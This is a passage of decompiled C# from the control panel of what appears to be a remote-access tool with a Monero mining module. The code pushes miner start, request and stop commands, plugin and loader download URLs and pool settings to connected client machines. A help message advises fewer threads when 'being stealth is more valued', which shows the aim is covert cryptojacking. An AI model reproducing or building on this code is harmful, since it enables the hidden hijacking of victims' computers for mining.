								Class135.smethod_0().PluginsURLXMR64,
								"|",
								stringBuilder2.ToString().ToLower(),
								"|",
								Class135.smethod_0().PluginsURLLoader,
								"|",
								text,
								text2,
								" -o ",
								this.vmethod_34().Text,
								text7,
								text3,
								text4,
								text5,
								text6,
								text8,
								text9
							});
							string sKey3 = cclient3.sKey;
							string string_ = "xmr64_mine_req|" + stringBuilder.ToString().ToLower() + "|" + stringBuilder2.ToString().ToLower();
							string string_2 = sKey3;
							Class136.Class138 @class = new Class136.Class138();
							@class.string_0 = string_2;
							@class.string_1 = string_;
							@class.long_0 = 0L;
							try
							{
								if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
								{
									new Thread(new ThreadStart(@class._Lambda$__0)).Start();
								}
							}
							catch (Exception ex3)
							{
							}
						}
						return;
					}
					finally
					{
						IEnumerator enumerator3;
						if (enumerator3 is IDisposable)
						{
							(enumerator3 as IDisposable).Dispose();
						}
					}
				}
				try
				{
					foreach (object obj4 in fastObjectListView.SelectedObjects)
					{
						CClient cclient4 = (CClient)obj4;
						cclient4.MINER_LAST_SETTINGS = string.Concat(new string[]
						{
							stringBuilder.ToString().ToLower(),
							"|",
							Class135.smethod_0().PluginsURLXMR,
							"|",
							text,
							text2,
							" -o ",
							this.vmethod_34().Text,
							text7,
							text3,
							text4,
							text5,
							text6,
							text8,
							text9
						});
						string sKey4 = cclient4.sKey;
						string string_ = "xmr_mine_req|" + stringBuilder.ToString().ToLower();
						string string_2 = sKey4;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex4)
						{
						}
					}
					return;
				}
				finally
				{
					IEnumerator enumerator4;
					if (enumerator4 is IDisposable)
					{
						(enumerator4 as IDisposable).Dispose();
					}
				}
			}
			if (!Class135.smethod_0().PluginsUpload)
			{
				if (this.vmethod_104().Checked)
				{
					try
					{
						foreach (object obj5 in fastObjectListView.Objects)
						{
							CClient cclient5 = (CClient)obj5;
							cclient5.MINER_LAST_SETTINGS = string.Concat(new string[]
							{
								stringBuilder.ToString().ToLower(),
								"|",
								Class135.smethod_0().PluginsURLXMR64,
								"|",
								stringBuilder2.ToString().ToLower(),
								"|",
								Class135.smethod_0().PluginsURLLoader,
								"|",
								text,
								text2,
								" -o ",
								this.vmethod_34().Text,
								text7,
								text3,
								text4,
								text5,
								text6,
								text8,
								text9
							});
							string sKey5 = cclient5.sKey;
							string string_ = "xmr64_mine_start|" + cclient5.MINER_LAST_SETTINGS;
							string string_2 = sKey5;
							Class136.Class138 @class = new Class136.Class138();
							@class.string_0 = string_2;
							@class.string_1 = string_;
							@class.long_0 = 0L;
							try
							{
								if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
								{
									new Thread(new ThreadStart(@class._Lambda$__0)).Start();
								}
							}
							catch (Exception ex5)
							{
							}
						}
						return;
					}
					finally
					{
						IEnumerator enumerator5;
						if (enumerator5 is IDisposable)
						{
							(enumerator5 as IDisposable).Dispose();
						}
					}
				}
				try
				{
					foreach (object obj6 in fastObjectListView.Objects)
					{
						CClient cclient6 = (CClient)obj6;
						cclient6.MINER_LAST_SETTINGS = string.Concat(new string[]
						{
							stringBuilder.ToString().ToLower(),
							"|",
							Class135.smethod_0().PluginsURLXMR,
							"|",
							text,
							text2,
							" -o ",
							this.vmethod_34().Text,
							text7,
							text3,
							text4,
							text5,
							text6,
							text8,
							text9
						});
						string sKey6 = cclient6.sKey;
						string string_ = "xmr_mine_start|" + cclient6.MINER_LAST_SETTINGS;
						string string_2 = sKey6;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex6)
						{
						}
					}
					return;
				}
				finally
				{
					IEnumerator enumerator6;
					if (enumerator6 is IDisposable)
					{
						(enumerator6 as IDisposable).Dispose();
					}
				}
			}
			if (this.vmethod_104().Checked)
			{
				try
				{
					foreach (object obj7 in fastObjectListView.Objects)
					{
						CClient cclient7 = (CClient)obj7;
						cclient7.MINER_LAST_SETTINGS = string.Concat(new string[]
						{
							stringBuilder.ToString().ToLower(),
							"|",
							Class135.smethod_0().PluginsURLXMR64,
							"|",
							stringBuilder2.ToString().ToLower(),
							"|",
							Class135.smethod_0().PluginsURLLoader,
							"|",
							text,
							text2,
							" -o ",
							this.vmethod_34().Text,
							text7,
							text3,
							text4,
							text5,
							text6,
							text8,
							text9
						});
						string sKey7 = cclient7.sKey;
						string string_ = "xmr64_mine_req|" + stringBuilder.ToString().ToLower() + "|" + stringBuilder2.ToString().ToLower();
						string string_2 = sKey7;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = string_2;
						@class.string_1 = string_;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex7)
						{
						}
					}
					return;
				}
				finally
				{
					IEnumerator enumerator7;
					if (enumerator7 is IDisposable)
					{
						(enumerator7 as IDisposable).Dispose();
					}
				}
			}
			try
			{
				foreach (object obj8 in fastObjectListView.Objects)
				{
					CClient cclient8 = (CClient)obj8;
					cclient8.MINER_LAST_SETTINGS = string.Concat(new string[]
					{
						stringBuilder.ToString().ToLower(),
						"|",
						Class135.smethod_0().PluginsURLXMR,
						"|",
						text,
						text2,
						" -o ",
						this.vmethod_34().Text,
						text7,
						text3,
						text4,
						text5,
						text6,
						text8,
						text9
					});
					string sKey8 = cclient8.sKey;
					string string_ = "xmr_mine_req|" + stringBuilder.ToString().ToLower();
					string string_2 = sKey8;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex8)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator8;
				if (enumerator8 is IDisposable)
				{
					(enumerator8 as IDisposable).Dispose();
				}
			}
		}
	}

	// Token: 0x06001029 RID: 4137 RVA: 0x00079420 File Offset: 0x00077620
	private void method_30(object sender, EventArgs e)
	{
		FastObjectListView fastObjectListView = Class130.fMain_0.vmethod_18();
		if (this.vmethod_30().Checked)
		{
			if (fastObjectListView.SelectedObjects == null)
			{
				return;
			}
			try
			{
				foreach (object obj in fastObjectListView.SelectedObjects)
				{
					string sKey = ((CClient)obj).sKey;
					string string_ = "xmr_mine_stop|1";
					string string_2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = string_2;
					@class.string_1 = string_;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
				}
				return;
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		try
		{
			foreach (object obj2 in fastObjectListView.Objects)
			{
				string sKey2 = ((CClient)obj2).sKey;
				string string_ = "xmr_mine_stop|1";
				string string_2 = sKey2;
				Class136.Class138 @class = new Class136.Class138();
				@class.string_0 = string_2;
				@class.string_1 = string_;
				@class.long_0 = 0L;
				try
				{
					if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}
		finally
		{
			IEnumerator enumerator2;
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x0600102A RID: 4138 RVA: 0x00007320 File Offset: 0x00005520
	private void method_31(object sender, EventArgs e)
	{
		Interaction.MsgBox("It's recommended to leave the number of threads to auto, especially when mining from several clients with different PC specifications.\r\nIf auto is selected, the miner will use as many threads as possible for optimal mining performance and typically consume about 50% of CPU power in average.\r\nBy setting a value for threads, like 16, will consume about 100% from CPUs having 8 cores and cause stuttering/lag on waker CPUs.\r\nIf being stealth is more valued, then it's recommended to use a low number for threads at the cost of reduced hash rate.\r\nI.e. 2-4 threads may be prefered and should consume between 25-50% of CPU power.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x0600102B RID: 4139 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_32(object sender, EventArgs e)
	{
	}

	// Token: 0x0600102C RID: 4140 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_33(object sender, EventArgs e)
	{
	}

	// Token: 0x0600102D RID: 4141 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_34(object sender, EventArgs e)
	{
	}

	// Token: 0x0600102E RID: 4142 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_35(object sender, EventArgs e)
	{
	}

	// Token: 0x0600102F RID: 4143 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_36(object sender, EventArgs e)
	{
	}

	// Token: 0x06001030 RID: 4144 RVA: 0x000795E0 File Offset: 0x000777E0
	private void method_37(object sender, EventArgs e)
	{
		this.vmethod_36().BringToFront();
		this.vmethod_36().Width = checked(base.Width - this.vmethod_36().Left - 35);
		this.vmethod_36().Anchor = (AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
		if (Operators.CompareString(this.vmethod_36().Text, "Username/wallet address", true) == 0)
		{
			this.vmethod_36().Text = string.Empty;
			this.vmethod_36().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_36().Font, FontStyle.Regular);
			this.vmethod_36().Font = font;
		}
	}

	// Token: 0x06001031 RID: 4145 RVA: 0x0007967C File Offset: 0x0007787C
	private void method_38(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_36().Text, string.Empty, true) == 0)
		{
			this.vmethod_36().Text = "Username/wallet address";
			this.vmethod_36().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_36().Font, FontStyle.Italic);
			this.vmethod_36().Font = font;
		}
		this.vmethod_36().Width = this.vmethod_34().Width;
		this.vmethod_36().Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
	}

	// Token: 0x0400061D RID: 1565
	private StatusStrip statusStrip_0;

	// Token: 0x0400061E RID: 1566
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x0400061F RID: 1567
	private ToolStripStatusLabel toolStripStatusLabel_1;

	// Token: 0x04000620 RID: 1568
	private OLVColumn olvcolumn_0;

	// Token: 0x04000621 RID: 1569
	private OLVColumn olvcolumn_1;

	// Token: 0x04000622 RID: 1570
	private OLVColumn olvcolumn_2;

	// Token: 0x04000623 RID: 1571
	private OLVColumn olvcolumn_3;

	// Token: 0x04000624 RID: 1572
	private OLVColumn olvcolumn_4;

	// Token: 0x04000625 RID: 1573
	private OLVColumn olvcolumn_5;

	// Token: 0x04000626 RID: 1574
	private OLVColumn olvcolumn_6;

	// Token: 0x04000627 RID: 1575
	private OLVColumn olvcolumn_7;

	// Token: 0x04000628 RID: 1576
	private FastObjectListView fastObjectListView_0;

	// Token: 0x04000629 RID: 1577
	private ToolStripStatusLabel toolStripStatusLabel_2;

	// Token: 0x0400062A RID: 1578
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x0400062B RID: 1579
	private RadioButton radioButton_0;

	// Token: 0x0400062C RID: 1580
	private RadioButton radioButton_1;

	// Token: 0x0400062D RID: 1581
	private Label label_0;

	// Token: 0x0400062E RID: 1582
	private TextBox textBox_0;

	// Token: 0x0400062F RID: 1583
	private TextBox textBox_1;

	// Token: 0x04000630 RID: 1584
	private Label label_1;

	// Token: 0x04000631 RID: 1585
	private Label label_2;

	// Token: 0x04000632 RID: 1586
	private ComboBox comboBox_0;

	// Token: 0x04000633 RID: 1587
	private ComboBox comboBox_1;

	// Token: 0x04000634 RID: 1588
	private Label label_3;

	// Token: 0x04000635 RID: 1589
	private OLVColumn olvcolumn_8;

	// Token: 0x04000636 RID: 1590
	private CheckBox checkBox_0;

	// Token: 0x04000637 RID: 1591
	private TextBox textBox_2;

	// Token: 0x04000638 RID: 1592
	private Label label_4;

	// Token: 0x04000639 RID: 1593
	private ComboBox comboBox_2;

	// Token: 0x0400063A RID: 1594
	private Label label_5;

	// Token: 0x0400063B RID: 1595
	private CheckBox checkBox_1;

	// Token: 0x0400063C RID: 1596
	private ComboBox comboBox_3;

	// Token: 0x0400063D RID: 1597
	private Label label_6;

	// Token: 0x0400063E RID: 1598
	private TextBox textBox_3;

	// Token: 0x0400063F RID: 1599
	private Label label_7;

	// Token: 0x04000640 RID: 1600
	private CheckBox checkBox_2;

	// Token: 0x04000641 RID: 1601
	private TextBox textBox_4;

	// Token: 0x04000642 RID: 1602
	private Label label_8;

	// Token: 0x04000643 RID: 1603
	private OLVColumn olvcolumn_9;

	// Token: 0x04000644 RID: 1604
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x04000645 RID: 1605
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x04000646 RID: 1606
	private ToolStripMenuItem toolStripMenuItem_1;

	// Token: 0x04000647 RID: 1607
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x04000648 RID: 1608
	private ToolStripMenuItem toolStripMenuItem_2;

	// Token: 0x04000649 RID: 1609
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x0400064A RID: 1610
	private ToolStripMenuItem toolStripMenuItem_3;

	// Token: 0x0400064B RID: 1611
	private ToolStripMenuItem toolStripMenuItem_4;

	// Token: 0x0400064C RID: 1612
	private ToolStripSeparator toolStripSeparator_2;

	// Token: 0x0400064D RID: 1613
	private ToolStripMenuItem toolStripMenuItem_5;

	// Token: 0x0400064E RID: 1614
	private ToolStripMenuItem toolStripMenuItem_6;

	// Token: 0x0400064F RID: 1615
	private ToolStripSeparator toolStripSeparator_3;

	// Token: 0x04000650 RID: 1616
	private ToolStripMenuItem toolStripMenuItem_7;

	// Token: 0x04000651 RID: 1617
	private CheckBox checkBox_3;

	// Token: 0x04000652 RID: 1618
	private PictureBox pictureBox_0;

	// Token: 0x04000653 RID: 1619
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x04000654 RID: 1620
	private VisualButton visualButton_0;

	// Token: 0x04000655 RID: 1621
	private VisualButton visualButton_1;

	// Token: 0x04000656 RID: 1622
	private PictureBox pictureBox_1;

	// Token: 0x04000657 RID: 1623
	public ConcurrentStack<cMinerXMRcli> concurrentStack_0;

	// Token: 0x04000658 RID: 1624
	public ConcurrentStack<cMinerXMRcli> concurrentStack_1;

	// Token: 0x04000659 RID: 1625
	public ConcurrentStack<cMinerXMRcli> concurrentStack_2;

	// Token: 0x0200011C RID: 284
	// (Invoke) Token: 0x06001035 RID: 4149
	private delegate void Delegate78(string string_0);

	// Token: 0x0200011D RID: 285
	// (Invoke) Token: 0x06001039 RID: 4153
	private delegate void Delegate79();

	// Token: 0x0200011E RID: 286
	// (Invoke) Token: 0x0600103D RID: 4157
	private delegate void Delegate80();

	// Token: 0x0200011F RID: 287
	// (Invoke) Token: 0x06001041 RID: 4161
	private delegate void Delegate81();

	// Token: 0x02000120 RID: 288
	// (Invoke) Token: 0x06001045 RID: 4165
	private delegate void Delegate82();

	// Token: 0x02000121 RID: 289
	// (Invoke) Token: 0x06001049 RID: 4169
	private delegate void Delegate83(string string_0, string string_1);

	// Token: 0x02000122 RID: 290
	// (Invoke) Token: 0x0600104D RID: 4173
	private delegate void Delegate84(string string_0, string[] string_1);
}
